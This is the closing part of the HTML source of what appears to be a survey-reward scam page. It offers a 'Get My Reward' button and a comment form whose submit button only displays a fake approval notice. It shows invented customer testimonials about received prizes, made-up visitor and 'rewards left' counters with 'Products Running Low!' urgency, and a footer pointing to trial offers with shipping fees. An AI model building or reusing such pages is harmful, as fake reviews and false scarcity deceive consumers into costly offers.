								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button> 
								 <div class="users_numb">61 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						
						 
					  </div>
                     </div>
   				<br>
   				<br>
   				<h4>How was your survey experience?</h4>
   				<ul class="list-group">	 
   					<li style="list-style: none">
   						<br>
   						<div id="confirmationbackground" class="well well-sm">
   							<div class="form-horizontal">
   								<fieldset id="commmentform">
   									<legend>Leave A Comment</legend>
   									<!-- Name input-->
   									<div class="form-group">
   										<label class="col-md-3 control-label" for="name">First Name</label>
   										<div class="col-md-6">
   											<input id="name" name="name" placeholder="" class="form-control" type="text">
   										</div>
   									</div>

   									<div class="form-group">
   										<label class="col-md-3 control-label" for="name">Surname</label>
   										<div class="col-md-6">
   											<input id="name" name="name" placeholder="" class="form-control" type="text">
   										</div>
   									</div>
   									<!-- Email input-->

   									<div class="form-group">
   										<label class="col-md-3 control-label" for="email">Email</label>
   										<div class="col-md-6">
   											<input id="email" name="email" placeholder="" class="form-control" type="email">
   										</div>
   									</div>

   									<!-- Message body -->
   									<div class="form-group">
   										<label class="col-md-3 control-label" for="message">Your Comment</label>
   										<div class="col-md-9">
   											<textarea class="form-control" id="message" name="message" placeholder="" rows="4"></textarea>
   										</div>
   									</div>
   									<div class="col-md-6"></div>
   									<div class="col-md-6">
   										<button id="commentbutton" style="font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background:; " class="text-center btn-lg click_claim_btn">Submit</button>
   									</div>
   									<script type="text/javascript">
   										$('#commentbutton').click(function(){
   											$('#commmentform').slideUp(1000, function(){
   												$('#confirmationbackground').html('<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>');
   												setTimeout(function(){
   													$('#confirmationbackground').html('<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>');
   													$('#confirmationbackground').css("background-color","#87EA55");
   												},2000)
   											})
   										})
   									</script>
   								</fieldset>
   							</div>
   						</div>
   					</li>
   				</ul>	
   				<ul class="list-group">
   					<li class="media list-group-item2">
   						<img class="media-object pull-left" src="images/1.png" alt="...">
   						<div class="media-body">
   							<p class="media-heading comment-name">Mary Beal<span class="comment-time"><script>r_comment_date(1);</script>May 7, 2019</span></p>
   							<p class="comment-body">Amazing!!!!</p>
   						</div>
   					</li>                        <li class="media list-group-item2">
   					<img class="media-object pull-left" src="images/2.png" alt="...">
   					<div class="media-body">
   						<p class="media-heading comment-name">Jade Wentworth<span class="comment-time"><script>r_comment_date(1);</script>May 6, 2019</span></p>
   						<p class="comment-body">My sunglasses actually came today. Not a bad deal at all!</p>
   					</div>
   				</li>                        <li class="media list-group-item2">
   				<img class="media-object pull-left" src="images/3.png" alt="...">
   				<div class="media-body">
   					<p class="media-heading comment-name">Claire Galway<span class="comment-time"><script>r_comment_date(2);</script>May 5, 2019</span></p>
   					<p class="comment-body">Good to give feedback and receive an offer.</p>
   				</div>
   			</li>                        <li class="media list-group-item2">
   			<img class="media-object pull-left" src="images/4.png" alt="...">
   			<div class="media-body">
   				<p class="media-heading comment-name">Sebastian Reynell<span class="comment-time"><script>r_comment_date(4);</script>May 4, 2019</span></p>
   				<p class="comment-body">I was a little skeptical at first but I just received my watch today! Stoked! </p>
   				<img style="margin-top:5px;display:inline-block" src="images/watch_img.jpg" alt="">
   			</div>
   		</li>              			 <li class="media list-group-item2">
   		<img class="media-object pull-left" src="images/5.png" alt="...">
   		<div class="media-body">
   			<p class="media-heading comment-name">Ryder Bradley<span class="comment-time"><script>r_comment_date(5);</script>May 3, 2019</span></p>
   			<p class="comment-body">Guys .. huge fan.. thanks.. love these surveys!</p>
   		</div>
   	</li>           <li class="media list-group-item2">
   	<img class="media-object pull-left" src="images/6.png" alt="...">
   	<div class="media-body">
   		<p class="media-heading comment-name">Anthony Denison <span class="comment-time"><script>r_comment_date(5);</script>May 2, 2019</span></p>
   		<p class="comment-body">Holy crap, FedEx knocked on the door an hour ago and dropped off two boxes!</p>
   	</div>
   </li> 

</ul>
</div>
<!-- resulet -->


</div>
<div class="footer_inform clearfix" id="footer_inform">
	<div class="left_fi">
		<span class="rand_style">23</span> Visitors on this page
	</div>
	<div class="right_fi">
		<span class="rand_2">12</span> Rewards left
	</div>
</div>
</div>
</div>
</section>
<div class="footer-icons"><span class="logo_block"><img src="images/block_logo.png" alt=""></span></div>
<div class="small_runpro" id="small_runpro"><span class=""><img src="images/clocksmall.png" alt=""></span> 2 Reward Just Claimed. Products Running Low!</div>
<div class="foot_text">
	<div class="icon_footer">

		<span><img src="images/ssl_img_new.png" alt=""></span>
	</div>
	<div class="footer_content"><b>2019 All Rights Reserved.</b><br>This website is not affiliated with or endorsed by Amazon and does not claim to represent, or own any of the trademarks, tradenames or rights associated with any of the products which are the property of their respective owners who do not own, endorse, or promote this site. All images on this site are readily available in various places on the Internet and believed to be in public domain according to the U.S. Copyright Fair Use Act (title 17, U.S. Code). *Trial offers offered on the last page require shipping and handling fees. See manufacturer’s site for details as terms vary with offers.</div>
</div>

</body>

<script>
	function goToNext(element){
		var currentQuestion=$(element).parent().attr('id');
		var nextQuestion=parseInt(currentQuestion)+1;
		jQuery('#'+currentQuestion).css("display","none");
		jQuery('#'+nextQuestion).css("display","block");
	}
	function last(element){
		var currentQuestion=$(element).parent().attr('id');
		jQuery('#'+currentQuestion).css("display","none");
		$('#loading-img').css("display","block");
		$('#footer_inform').css("display","none");
		$('#small_runpro').css("display","none");
		setTimeout(function(){ 
			$('#loading-img').css("display","none");
		}, 4000);
		setTimeout(function(){ 
			$('#results').css("display","block");
			$('.reviewbox').css("display","none");
			$('#tellAboutYourSelf').css("display","none");
			$('#thankYouOnComletion').css("display","block");							
		}, 4000);

	}
</script>
<script>
	var dt = new Date();
	document.getElementById("datetime").innerHTML = dt.toLocaleDateString();
</script>
<script>
	var dt = new Date();
	document.getElementById("datetime2").innerHTML = dt.toLocaleDateString();
</script>

</html>